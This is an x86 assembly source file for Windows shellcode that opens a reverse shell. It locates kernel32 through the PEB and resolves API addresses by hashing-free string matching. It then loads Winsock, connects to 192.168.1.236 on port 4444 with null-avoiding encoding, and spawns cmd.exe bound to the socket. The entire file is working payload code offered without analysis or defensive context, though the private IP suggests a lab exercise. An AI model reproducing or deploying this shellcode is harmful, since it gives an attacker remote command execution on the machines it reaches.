global _start

section .text
_start:


getkernel32:
	xor ecx, ecx				
	mul ecx						
	mov eax, [fs:ecx + 0x030]	
	mov eax, [eax + 0x00c]		
	mov esi, [eax + 0x014]		
	lodsd				
	xchg esi, eax				
	lodsd						; ntdll.dll address loaded (2nd module)
	mov ebx, [eax + 0x10]		; kernel32.dll address loaded in ebx (3rd module)

	; EBX = base of kernel32.dll address

getAddressofName:
	mov edx, [ebx + 0x3c]		
	add edx, ebx				
	mov edx, [edx + 0x78]		
	add edx, ebx
	mov esi, [edx + 0x20]		
	add esi, ebx
	xor ecx, ecx

	

getProcAddress:
	inc ecx 						
	lodsd							
	add eax, ebx				
	cmp dword [eax], 0x50746547			
	jnz getProcAddress
	cmp dword [eax + 0x4], 0x41636F72	
	jnz getProcAddress
	cmp dword [eax + 0x8], 0x65726464	
	jnz getProcAddress

getProcAddressFunc:
	mov esi, [edx + 0x24]		
	add esi, ebx 				
	mov cx, [esi + ecx * 2] 	
	dec ecx
	mov esi, [edx + 0x1c]    	
	add esi, ebx             	
	mov edx, [esi + ecx * 4] 	
	add edx, ebx             	; EDX = getProcAddress
	mov ebp, edx 				

getLoadLibraryA:
	xor ecx, ecx 				
	push ecx 					
	push 0x41797261   			
	push 0x7262694c				
	push 0x64616f4c 			
	push esp
	push ebx 					; kernel32.dll
	call edx 					; call GetProcAddress and find LoadLibraryA address


getws2_32:
	push 0x61613233			        
	sub word [esp + 0x2], 0x6161   
	push 0x5f327377 		       
	push esp                       
	call eax 						
	mov esi, eax                   

getWSAStartup:
	push 0x61617075                  
	sub word [esp + 0x2], 0x6161     
	push 0x74726174                
	push 0x53415357                 
	push esp	                   
	push esi	                     
	call ebp                         ; GetProcAddress(ws2_32.dll, WSAStartup)

callWSAStartUp:
	xor edx, edx
	mov dx, 0x190          
	sub esp, edx           
	push esp              
	push edx               
	call eax               

getWSASocketA:
	push 0x61614174                  
	sub word [esp + 0x2], 0x6161         
	push 0x656b636f                  
	push 0x53415357                
	push esp                        
	push esi                        
	call ebp                         ; GetProcAddress(ws2_32.dll, WSASocketA)

callWSASocketA:
	xor edx, edx		           
	push edx;		              
	push edx;		             
	push edx;		               
	mov dl, 0x6		            
	push edx
	sub dl, 0x5      	          
	push edx		            
	inc edx			               
	push edx
	call eax		                ; call WSASocketA
	push eax		               
	pop edi			               

getConnect:
	push 0x61746365                 
	sub word [esp + 0x3], 0x61      
	push 0x6e6e6f63                 
	push esp	                    
	push esi	                   
	call ebp                        ; GetProcAddress(ws2_32.dll, connect)

callConnect:
	;set up sockaddr_in
	mov edx, 0xed02a9c1	            ;the IP plus 0x11111111 so we avoid NULLs (IP=192.168.1.236)
	;mov edx, 0x0401090b
	sub edx, 0x01010101	            ;subtract from edx to obtain the real IP
	push edx                        
	push word 0x5c11                ;0x115c = (port 4444)
	xor edx, edx
	mov dl, 2
	push dx	
	mov edx, esp
	push byte 0x10
	push edx
	push edi
	call eax

getCreateProcessA:
	xor ecx, ecx 					
	push 0x61614173					
	sub word [esp + 0x2], 0x6161 	
	push 0x7365636f 				
	push 0x72506574					
	push 0x61657243 				
	push esp 						
	push ebx 						
	call ebp 						; GetProcAddress(kernel32.dll, CreateProcessA)
	mov esi, ebx                    

shell:
	push 0x61646d63                
	sub word [esp + 0x3], 0x61      
	mov ebx, esp                    
	push edi                       
	push edi                     
	push edi                       
	xor edi, edi                   
	push byte 0x12                 
	pop ecx                         

push_loop:
	push edi                        
	loop push_loop                  
	mov word [esp + 0x3C], 0x0101   
	mov byte [esp + 0x10], 0x44
	lea ecx, [esp + 0x10]  

  	;perform the call to CreateProcessA
	push esp               
	push ecx               
	push edi               
	push edi               
	push edi               
	inc edi                
	push edi               
	dec edi                
	push edi               
	push edi               
	push ebx               
	push edi               
	call eax

getExitProcess:
	add esp, 0x010 				
	push 0x61737365				
	sub word [esp + 0x3], 0x61  
	push 0x636F7250				
	push 0x74697845				
	push esp
	push esi
	call ebp                    ; GetProcAddress(kernel32.dll, ExitProcess)

	xor ecx, ecx
	push ecx
	call eax